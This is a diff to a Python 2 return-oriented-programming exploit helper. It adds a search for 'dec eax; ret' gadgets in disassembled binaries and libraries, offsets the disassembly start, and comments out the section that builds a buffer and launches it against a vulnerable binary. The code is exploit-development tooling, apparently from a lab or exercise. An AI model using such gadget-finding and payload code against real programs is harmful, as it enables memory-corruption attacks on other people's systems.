@@ -47,7 +47,7 @@ def get_binary_instr(filename):
         ret_index = []
         instr_list = []
         count = 0
-        for instr in md.disasm(val, startAddr):
+        for instr in md.disasm(val[3:], startAddr + 3):
             instr_list.append(instr)
             if 'ret' in instr.mnemonic:
                 ret_index.append(count)
@@ -253,6 +253,39 @@ def find_inc_ret(instr_list, ret_index):
         print 'inc eax gadget not found !'
         return None
 
+def find_dec_ret(instr_list, ret_index):
+    # find dec eax, ret
+    max_depth = 4
+    for depth in range(1,max_depth):
+        found = False
+        for index in ret_index:
+            temp_index = index - depth
+
+            if not ('dec' in instr_list[temp_index].mnemonic and 'eax' in instr_list[temp_index].op_str):
+                continue
+
+            print 'atleast here !'
+            temp_index = temp_index + 1
+            found = True
+            while temp_index < index:
+                if 'call' in instr_list[temp_index].mnemonic or instr_list[temp_index].mnemonic[0] == 'j':
+                    found = False
+                    break
+                temp_index = temp_index + 1
+
+            if found == True:
+                break
+
+        if found == True:
+            break
+
+    if found == True:
+        print 'Found dec eax,ret; at address 0x%x with depth = %d' %(instr_list[temp_index].address-2,depth)
+        return (instr_list[temp_index].address-2)
+    else:
+        print 'dec eax gadget not found !'
+        return None
+
 def find_xor_ret(instr_list, ret_index):
     # find xor eax, eax, ret;
     max_depth = 4
@@ -347,10 +380,37 @@ if __name__ == '__main__':
         print '%s binary not present !' %(args.vuln_bin)
         exit(2)
     lib_list.append((instr, ret, 0, args.vuln_bin))
-   
+
     for entry in lib_list:
         print 'Found %d instructions with %d rets' %(len(entry[0]), len(entry[1]))
- 
+
+
+    test = None
+    for entry in lib_list:
+        if len(entry) != 4:
+            print 'Inconsistent entry in library structure !'
+            exit(3)            
+
+        instr = entry[0]
+        ret = entry[1]
+        
+        if instr == None or ret == None:
+            print 'Inconsistent data for libraries !'
+            exit(3)
+
+        result = find_dec_ret(instr, ret)
+        if result != None:
+            test = result + entry[2]
+            print 'Found gadget at address 0x%x' %(test)
+            break
+
+    if test == None:
+        print 'Unable to find gadget !'
+        exit(3)
+
+
+
+''' 
     pop_pop_ret_addr = None
     for entry in lib_list:
         if len(entry) != 4:
@@ -493,4 +553,4 @@ if __name__ == '__main__':
     print "#"*int(columns)
 
     subprocess.call([args.vuln_bin, buf])
-
+'''
